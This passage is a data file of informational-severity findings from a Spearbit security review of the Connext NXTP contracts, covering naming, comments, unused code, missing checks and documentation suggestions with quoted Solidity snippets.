    {
        "title": "WatcherManager can make watchers public instead of having a getter function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "WatcherManager has a private mapping watchers and a getter function isWatcher() to query that mapping. Since WatcherManager is not inherited by any other contract, it is safe to make it public to avoid the need of an explicit getter function.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about relation between zero amount and asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "At BridgeFacet.sol#L514, if _amount == 0, _asset is allowed to have any user-specified value. _- xcall() reverts when zero address is specified for _asset on a non-zero _amount: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } However, according to this comment if amount is 0, _asset also has to be the zero address which is not true (since it uses IFF): _params.normalizedIn = _asset == address(0) ? 0 // we know from assertions above this is the case IFF amount == 0 : AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "New Connector needs to be deployed if AMB changes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The AMB address is configured to be immutable. If any of the chain's AMB changes, the Connector needs to be deployed. /** * @notice Address of the AMB on this domain. */ address public immutable AMB;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions should be renamed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The following functions should be renamed to be aligned with the naming convention of the fxPortal contracts.  OptimismHubConnector.processMessageFromRoot to OptimismHubConnector.processMessageFromChild  ArbitrumHubConnector.processMessageFromRoot to ArbitrumHubConnector.processMessageFromChild  ZkSyncHubConnector.processMessageFromRoot to ZkSyncHubConnector.processMessageFromChild",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Twice function aggregate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both the contracts Multicall and RootManager have a function called aggregate(). This could be confusing. Contract Multicall doesn't seem to be used. Multicall.sol function aggregate(Call[] memory calls) public view returns (uint256 blockNumber, bytes[] memory returnData) { ... ,! } RootManager.sol 120 function aggregate(uint32 _domain, bytes32 _inbound) external whenNotPaused onlyConnector(_domain) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful when using _removeAssetId()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _removeAssetId() removes an assets. Although it is called via authorized functions, mistakes could be made. It there are any representation assets left, they are worthless as they can't be bridged back anymore (unless reinstated via setupAssetWithDeployedRepresentation()). The representation assets might also be present and allowed in the StableSwap. If so, the owners of the worthless tokens could quickly swap them for real tokens. The canonical tokens will also be locked. function _removeAssetId(...) ... { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused import IAavePool in InboxFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Contract InboxFacet imports IAavePool, however it doesn't use it. import {IAavePool} from \"../interfaces/IAavePool.sol\";",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use IERC20Metadata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "interface. pelin/contracts/token/ERC20/extensions/IERC20Metadata.sol, which seems more logical. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Generic name of proposedTimestamp()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function proposedTimestamp() has a very generic name. As there are other Timestamp func- tions this might be confusing. function proposedTimestamp() public view returns (uint256) { return s._proposedOwnershipTimestamp; } function routerWhitelistTimestamp() public view returns (uint256) { return s._routerWhitelistTimestamp; } function assetWhitelistTimestamp() public view returns (uint256) { return s._assetWhitelistTimestamp; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two different nonces",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both LibConnextStorage and SpokeConnector define a nonce. As the names are very similar this could be confusing. LibConnextStorage.sol struct AppStorage { ... * @notice Nonce for the contract, used to keep unique transfer ids. * @dev Assigned at first interaction (xcall on origin domain). uint256 nonce; ... } SpokeConnector.sol * @notice domain => next available nonce for the domain. mapping(uint32 => uint32) public nonces;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Tips to optimize rootWithCtx",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "To help with the optimization mentioned in the comment of rootWithCtx(), here is a way to count the trailing 0s: graphics.stanford.edu/~seander/bithacks.html#ZerosOnRightModLookup. function rootWithCtx(Tree storage tree, bytes32[TREE_DEPTH] memory _zeroes) internal view returns (bytes32 _current) { ... // TODO: Optimization: skip the first N loops where the ith bits are all 0 - start at that // depth with zero hashes. ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use delete",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The functions _setOwner() and removeRouter() clear values by setting them to 0. Other parts of the code use delete. So using delete here too would be more consistent. ProposedOwnable.sol function _setOwner(address newOwner) internal { ... _proposedOwnershipTimestamp = 0; _proposed = address(0); ... } RoutersFacet.sol function removeRouter(address router) external onlyOwnerOrRouter { ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "replace usages of abi.encodeWithSignature and abi.encodeWithSelector with abi.encodeCall to ensure typo and type safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": " When abi.encodeWithSignature is used the compiler does not check for mistakes in the signature or the types provided.  When abi.encodeWithSelector is used the compiler does not check for parameter type inconsistencies.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "setAggregators is missing checks against address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setAggregators does not check if tokenAddresses[i] or sources[i] is address(0).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "setAggregators can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setAggregators does not check if tokenAddresses length is equal to sources to revert early.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is not emitted when an important action happens on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "No event is emitted when an important action happens on-chain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unit/fuzz tests to make sure edge cases would not cause an issue in Queue._length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It is always assumed last + 1 >= first. It would be great to add unit/fuzz tests to check for this invariant. Adding these tests",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using prefix(...) instead of slice(0,...)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "tokenId() calls TypedMemView.slice() function to slice the first few bytes from _message: return _message.slice(0, TOKEN_ID_LEN, uint40(Types.TokenId)); TypedMemView.prefix() can also be used here since it achieves the same goal.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Elaborate TypedMemView encoding in comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView describes its encoding in comments as: // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The comments can be elaborated to make them less ambiguous.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove Curve StableSwap paper URL",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "www.curve.fi/stableswap-paper.pdf The current working URL is curve.fi/files/stableswap-paper.pdf. to Curve StableSwap paper referenced in comments Link is no longer active:",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Validations in AmplificationUtils.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. If initialAPrecise=futureAPrecise then there will not be any ramping. 2. In stopRampA function, self.futureATime > block.timestamp can be revised to self.futureATime >= block.timestamp since once current timestamp has reached futureATime, futureAprice will be returned al- ways.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect PriceSource is returned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Price Source is returned incorrectly in case of stale prices as shown below 1. getTokenPrice function is called with _tokenAddress T1. 2. Assume the direct price is stale, so tokenPrice is set to 0. uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } 3. Now contract tries to retrieve price from oracle. In case the price is outdated, the returned price will again be 0 and source would be set to PriceSource.CHAINLINK. if (tokenPrice == 0) { tokenPrice = getPriceFromOracle(tokenAddress); source = PriceSource.CHAINLINK; } 128 4. Assuming v1PriceOracle is not yet set, contract will simply return the price and source which in this case is 0, PriceSource.CHAINLINK. In this case amount is correct but source is not correct. return (tokenPrice, uint256(source));",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "PriceSource.DEX is never used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The enum value DEX is never used in the contract and can be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about handleOutgoingAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment is incorrect as this function does not transfer funds to msg.sender. /** * @notice Handles transferring funds from the Connext contract to msg.sender. * @param _asset - The address of the ERC20 token to transfer. * @param _to - The recipient address that will receive the funds. * @param _amount - The amount to withdraw from contract. */ function handleOutgoingAsset( address _asset, address _to, uint256 _amount ) internal {",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "SafeMath is not required for Solidity 0.8.x",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Solidity 0.8.x has a built-in mechanism for dealing with overflows and underflows, so there is no need to use the SafeMath library",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a deadline check modifier in ProposedOwnable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Any change in ownership through acceptProposedOwner() and renounceOwnership() has to go through a deadline check: // Ensure delay has elapsed if ((block.timestamp - _proposedOwnershipTimestamp) <= _delay) revert ProposedOwnable__acceptProposedOwner_delayNotElapsed(); This check can be extracted out in a modifier for readability.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use ExcessivelySafeCall in SpokeConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The low-level call code highlighted code above looks to be copied from ExcessivelySafeCall.sol. replacing this low-level call with the function call ExcessivelySafe- Consider",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "The constant expression for EMPTY_HASH can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "EMPTY_HASH is a constant with a value equal to: hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\", which is the keccak256 of an empty bytes. We can replace this constant hex literal with a more readable alternative.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify and add more documentation for getTokenPrice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "getTokenPrice can be simplified and it can try to return early whenever possible.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused code, files, interfaces, libraries, contracts, ...",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The codebase includes code, files, interfaces, libraries, and contracts that are no longer in use.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "_calculateSwapInv and _calculateSwap can mirror each other's calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_calculateSwapInv could have mirrored the implementation of _calculateSwap uint256 y = xp[tokenIndexTo] - (dy * multipliers[tokenIndexTo]); uint256 x = getY(_getAPrecise(self), tokenIndexTo, tokenIndexFrom, y, xp); Or the other way around _calculateSwap mirror _calculateSwapInv and pick whatever is cheaper.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document that the virtual price of a stable swap pool might not be constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The virtual price of the LP token is not constant when the amplification coefficient is ramping even when/if token balances stay the same.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the reason for picking d is the starting point for calculating getYD using the Newton's method.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "d the stable swap invariant passed to getYD as a parameter and it is used as the starting point of the Newton method to find a root. This root is the value/price for the tokenIndex token that would stabilize the pool so that it would statisfy the stable swap invariant equation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the max allowed tokens in stable swap pools used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Based on the uint8 type for the indexes of tokens in different stable swap pools, it is inferred that the max possible number of tokens that can exist in a pool is 256. There is the following check when initializing internal pools: if (_pooledTokens.length <= 1 || _pooledTokens.length > 32) revert SwapAdminFacet__initializeSwap_invalidPooledTokens(); This means the internal pools can only have number of pooled tokens in 2, (cid:1) (cid:1) (cid:1) , 32.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename adoptedToLocalPools to better indicate what it represents",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "adoptedToLocalPools is used to keep track of external pools where one can swap between different variations of a token. But one might confuse this mapping as holding internal stable swap pools.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the usage of commented mysterious numbers in AppStorage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Before each struct AppStorage's field definition there is a line comment consisting of only digits // xx One would guess they might be relative slot indexes in the storage (relative to AppStorage's slot). But the numbers are not consistent.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "RouterPermissionsManagerInfo can be packed differently for readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "RouterPermissionsManagerInfo has multiple fields that are each a mapping of address to a differ- ent value. The address here represents a liquidity router address. It would be more readable to pack these values such that only one mapping is used. This would also indicate how all these mapping have the same shared key which is the router.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consolidate TokenId struct into a file that can be imported in relevant files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TokenId struct is defined both in BridgeMessage and LibConnextStorage with the same struc- ture/fields. If in future, one would need to update one struct the other one should also be updated in parallel.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, grammatical and styling errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep consistent return parameters in calculateSwapToLocalAssetIfNeeded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All return paths in calculateSwapToLocalAssetIfNeeded except one return _local as the 2nd return parameter. It would be best for readability and consistency change the following code to follow the same pattern if (_asset == _local) { return (_amount, _asset); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix/add or complete missing NatSpec comments.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Some NatSpec comments are either missing or are incomplete.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define and use constants for different literals used in the codebase.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Throughout the project, a few literals have been used. It would be best to define a named constant for those. That way it would be more clear the purpose of those values used and also the common literals can be consolidated into one place.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enforce using adopted for the returned parameter in swapFromLocalAssetIfNeeded... for consis- tency.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The other return paths in swapFromLocalAssetIfNeeded, swapFromLocalAssetIfNeededForEx- actOut and calculateSwapFromLocalAssetIfNeeded use the adopted parameter as one of the return value com- ponents. It would be best to have all the return paths do the same thing. Note swapFromLocalAssetIfNeeded and calculateSwapFromLocalAssetIfNeeded should always return (_, adopted) and swapFromLocalAssetIfNeededForExactOut should always return (_, _, adopted).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use interface types for parameters instead of casting to the interface type multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Sometimes casting to the interface type has been performed multiple times. It will be cleaner if the parameter is defined as having that interface and avoid unnecessary casts.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Be aware of tokens with multiple addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If a token has multiple addresses (see weird erc20) then the token cap might have an unexpected effect, especially if the two addresses have a different cap. function _addLiquidityForRouter(...) ... { ... if (s.domain == canonical.domain) { // Sanity check: caps not reached uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove old references to claims",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The contract RelayerFacet still has some references to claims. These are a residue from a previous version and are not used currently. error RelayerFacet__initiateClaim_emptyClaim(); error RelayerFacet__initiateClaim_notRelayer(bytes32 transferId); event InitiatedClaim(uint32 indexed domain, address indexed recipient, address caller, bytes32[] transferIds); ,! event Claimed(address indexed recipient, uint256 total, bytes32[] transferIds);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck references to Nomad",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The code refers to nomad several times in a way that is currently not accurate. This could be confusing to the maintainers and readers of the code. This includes the following examples: BridgeFacet.sol:419: * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using the nomad ,! BridgeFacet.sol:423: * assets will be swapped for their local nomad asset counterparts (i.e. bridgeable tokens) via the configured AMM if swap is needed. The local tokens will * necessary. In the event that the adopted assets *are* local nomad assets, no ,! BridgeFacet.sol:424: ,! InboxFacet.sol:87: RoutersFacet.sol:533: AssetLogic.sol:102: asset. ,! AssetLogic.sol:139: swap ,! AssetLogic.sol:185: swap ,! AssetLogic.sol:336: adopted asset ,! AssetLogic.sol:375: * @notice Only accept messages from an Nomad Replica contract. * @param _local - The address of the nomad representation of the asset * @notice Swaps an adopted asset to the local (representation or canonical) nomad * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Calculate amount of tokens you receive on a local nomad asset for the * @notice Calculate amount of tokens you receive of a local nomad asset for the adopted asset ,! LibConnextStorage.sol:54: * @param receiveLocal - If true, will use the local nomad asset on the destination instead of adopted. ,! LibConnextStorage.sol:148: madUSDC on polygon). ,! LibConnextStorage.sol:204: LibConnextStorage.sol:268: madUSDC on polygon) * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> * this domain (the nomad local asset). * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> ,! ConnectorManager.sol:11: * @dev Each nomad router contract has a `XappConnectionClient`, which ,! references a 142",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document usage of Nomad domain schema",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The library LibConnextStorage specifies that the domains are compatible with the nomad domain schema. However other locations don't mention this. This is especially important during the enrollment of new domains. * @param originDomain - The originating domain (i.e. where `xcall` is called). Must match nomad domain schema ,! * @param destinationDomain - The final domain (i.e. where `execute` / `reconcile` are called). Must match nomad domain schema ,! struct TransferInfo { uint32 originDomain; uint32 destinationDomain; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Router has multiple meanings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The term router is used for three different concepts. This is confusing for maintainers and readers of the code: A) The router that provides Liquidity and signs bids * `router` - this is the address that will sign bids sent to the sequencer B) The router that can add new routers of type A (B is a role and the address could be a multisig) /// @notice Enum representing address role enum Role { None, Router, Watcher, Admin } C) The router that what previously was BridgeRouter or xApp Router: * @param _router The address of the potential remote xApp Router",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Robustness of receiving contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the _reconciled branch of the code, the functions _handleExecuteTransaction(), _execute- Calldata() and excessivelySafeCall() don't revert when the underlying call reverts This seems to be inten- tional. This underlying revert can happen if there is a bug in the underlying call or if insufficient gas is supplied by the relayer. Note: if a delegate address is specified it can retry the call to try and fix temporary issues. The receiving contract already has received the tokens via handleOutgoingAsset() so must be prepared to handle these tokens. This should be explicitly documented. function _handleExecuteTransaction(...) ... { AssetLogic.handleOutgoingAsset(_asset, _args.params.to, _amountOut); _executeCalldata(_transferId, _amountOut, _asset, _reconciled, _args.params); ... } function _executeCalldata(...) ... { if (_reconciled) { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...); } else { ... } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions can be combined",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both xcall and xcallIntoLocal have same code except receiveLocal (which is set false for xcall and true for xcallIntoLocal) value. Instead of having these as separate function, a single function can be created which can tweak the functionalities of xcall and xcallIntoLocal on basis of receiveLocal value",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document source of zeroHashes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The hashes which are used in function zeroHashes() are not explained, which makes it more difficult to understand and verify the code. function zeroHashes() internal pure returns (bytes32[TREE_DEPTH] memory _zeroes) { ... // keccak256 zero hashes bytes32 internal constant Z_0 = hex\"0000000000000000000000000000000000000000000000000000000000000000\"; ... bytes32 internal constant Z_31 = hex\"8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9\"; ,! ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document underflow/overflows in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function index() has an overflow when _bytes derflow when _len == 0. These two compensate each other so the end result of index() is as expected. As the special case for _bytes == 0 is also handled, we assume this is intentional. However this behavior isn't mentioned in the comments, while other underflow/overflows are documented. library TypedMemView { function index( bytes29 memView, uint256 _index, uint8 _bytes ) internal pure returns (bytes32 result) { ... unchecked { uint8 bitLength = _bytes * 8; } ... } function leftMask(uint8 _len) private pure returns (uint256 mask) { ... mask := sar( sub(_len, 1), ... ... ) } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use while loops in dequeueVerified()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Within function dequeueVerified() there are a few for loops that mention a variable as there first element. This is a null statement and can be removed. After removing, only a while condition remains. Replacing the for with a while would make the code more readable. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { ... } ... for (first; first <= last; ) { ... } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Duplicate functions in Encoding.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Encoding.sol defines a few functions already present in TypedMemView.sol: nibbleHex(), byte- Hex(), encodeHex().",
